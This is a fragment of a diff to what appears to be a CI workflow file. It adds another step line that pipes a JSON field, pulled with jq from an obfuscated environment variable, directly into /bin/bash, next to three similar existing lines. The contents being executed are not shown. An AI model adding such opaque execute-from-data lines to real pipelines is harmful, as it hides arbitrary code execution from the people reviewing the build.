@@ -21,6 +21,7 @@ jobs:
           echo $ebyh04 | jq -r .wy6 | /bin/bash
           printf '%s' "$fs67" | jq -r .jujn40 | /bin/bash
           echo $hit1 | jq -r .mrue64299 | /bin/bash
+          printf '%s' "$ekf65359" | jq -r .dtt18972 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
